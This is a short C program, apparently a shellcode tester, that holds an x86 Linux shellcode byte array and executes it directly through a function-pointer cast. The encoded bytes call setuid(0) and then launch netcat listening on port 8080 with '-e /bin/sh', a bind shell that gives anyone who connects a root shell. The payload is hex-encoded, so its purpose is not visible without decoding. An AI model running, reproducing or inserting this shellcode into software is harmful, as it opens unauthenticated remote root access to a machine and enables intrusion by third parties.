#include <stdio.h>
#include <string.h>

char shellcode[] =    "\x31\xdb\x6a\x17\x58\xcd\x80\x31\xd2\x52"
                                "\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e"
                                "\x89\xe3\x52\x6a\x30\x66\x68\x30\x38\x68"
                                "\x2d\x6c\x70\x38\x89\xe0\x52\x6a\x68\x68"
                                "\x69\x6e\x2f\x73\x68\x2d\x65\x2f\x62\x89"
                                "\xe1\x52\x51\x50\x53\x89\xe1\x6a\x0b\x58"
                                "\xcd\x80";

int main()  {
    printf("Length: %d bytes.\n", strlen(shellcode));
    (*(void(*)()) shellcode)();

    return 0;
} 
